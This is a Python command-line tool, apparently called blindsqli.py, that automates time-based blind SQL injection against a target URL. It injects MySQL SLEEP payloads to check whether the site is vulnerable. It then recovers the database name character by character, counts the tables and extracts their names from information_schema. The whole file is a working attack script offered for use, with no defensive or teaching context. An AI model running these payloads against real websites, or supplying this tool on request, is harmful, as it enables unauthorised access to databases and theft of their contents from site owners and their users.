import requests
import argparse
import textwrap
import sys
import string
from urllib.parse import quote_plus

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, 
epilog = textwrap.dedent('''
Example: blindsqli.py -u https://www.test.com/index.php?id=1
         blindsqli.py -u https://www.test.com/index.php?id=1 -d
         blindsqli.py -u https://www.test.com/index.php?id=1 -t -s 5
    '''))
parser.add_argument('-u', '--url', type=str, help='url to be checked', required=True)
parser.add_argument('-d', '--database', help='get database name', action="store_true")
parser.add_argument('-t', '--table', help='get table name', action="store_true")
parser.add_argument('-a', '--all', help='get all database and table name', action="store_true")
parser.add_argument('-s', '--time', type=int, help='set time for blind sqli (default=3)', default=3)
args = parser.parse_args()

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

COLOR = {
    "BLUE": "\033[0;34m",
    "GREEN": "\033[0;32m",
    "RED" : "\033[0;31m",
    "YELLOW" : "\033[0;93m",
    "ENDC": "\033[0m",
}

def check_url():
    query = "' AND (SELECT IF(STRCMP('a','a') = 0,SLEEP(%s),null))#" % (args.time)
    url = args.url + quote_plus(query)
    request = requests.get(url)
    time = request.elapsed.total_seconds()
    if time > args.time:
        return True
    else:
        return False

def check_db():
    db_name = ""
    db_length = 0
    for num in range(50):
        query = "' AND (SELECT IF(LENGTH(database()) = %s,sleep(%s),null))#" % (num, args.time)
        url = args.url + quote_plus(query)
        request = requests.get(url)
        time = request.elapsed.total_seconds()
        if time > args.time:
            db_length = num
    
    for pointer in range(1, db_length+1):
        for char in chars:
            query = "' AND (SELECT IF(substr(database(),%s,1) like '%s',sleep(%s),null))#" % (pointer, char, args.time)
            url = args.url + quote_plus(query)
            request = requests.get(url)
            time = request.elapsed.total_seconds()
            if time > args.time:
                db_name += char
                break
    return db_name

def check_total_tbl():
    for num in range(20):
        query = "' AND (SELECT IF(SUBSTR((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,2) = %s,sleep(%s),null))#" % (num, args.time)
        url = args.url + quote_plus(query)
        request = requests.get(url)
        time = request.elapsed.total_seconds()
        if time > args.time:
            return num

def check_table(total):
    tbl_name = []
    temp = ""

    for point_table in range (0, total):
        for point_char in range (20):
            for char in chars:
                query = "' AND (SELECT IF(ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII('%s'),sleep(%s),null))#" % (point_table, point_char, char, args.time)
                url = args.url + quote_plus(query)
                request = requests.get(url)
                time = request.elapsed.total_seconds()
                if time > args.time:
                    temp += char
                    break
        if temp != "":
            tbl_name.append(temp)
        temp = ""
    return tbl_name

def main():
    print("""
   ___  ___         __________    __   ____
  / _ )/ (_)__  ___/ / __/ __ \  / /  /  _/
 / _  / / / _ \/ _  /\ \/ /_/ / / /___/ /  
/____/_/_/_//_/\_,_/___/\___\_\/____/___/  
                                                                                                         
""")
    print("[>] Url: " + f"{COLOR['YELLOW']}{args.url}{COLOR['ENDC']}\n")
    
    try:
        print("[+] Checking the url...")
        if check_url():
            print("[+] Url is vulnerable to SQL Injection")
        else:
            print(f"{COLOR['RED']}[!] Url unable to do SQL Injection.{COLOR['ENDC']}")
            sys.exit(1)
    except requests.exceptions.ConnectionError:
        print(f"{COLOR['RED']}[!] Failed to connect to the url! Please recheck the url.{COLOR['ENDC']}")
        sys.exit(1)
    except KeyboardInterrupt:
            print("[!] Keyboard interrupt detected! Exiting program...")
    except Exception as e:
        print(e)
        # print(f"{COLOR['RED']}[!] Unable to do SQL Injection.{COLOR['ENDC']}")
        sys.exit(1)
    
    if args.database or args.table or args.all:
        print("[+] Processing to do SQL Injection...")

    if args.database or args.all:
        try:
            print(f"{COLOR['GREEN']}[>] Database name: {check_db()}{COLOR['ENDC']}")
        except KeyboardInterrupt:
            print("[!] Keyboard interrupt detected! Exiting program...")
        except:
            print(f"{COLOR['RED']}[!] Failed to check for database.{COLOR['ENDC']}")

    if args.table or args.all:
        try:
            total = check_total_tbl()
            print(f"{COLOR['GREEN']}[>] Total table: {total}{COLOR['ENDC']}")
            print("[+] Checking tables name, it might take so time. Do not panic if it looks stuck.")
            tbl_name = check_table(total)
            print(f"{COLOR['GREEN']}[>] Tables name: " + ', '.join(map(str,tbl_name)) + f"{COLOR['ENDC']}")
        except KeyboardInterrupt:
            print("[!] Keyboard interrupt detected! Exiting program...")
        except:
            print(f"{COLOR['RED']}[!] Failed to check for total table.{COLOR['ENDC']}")

if __name__ == "__main__":
    main()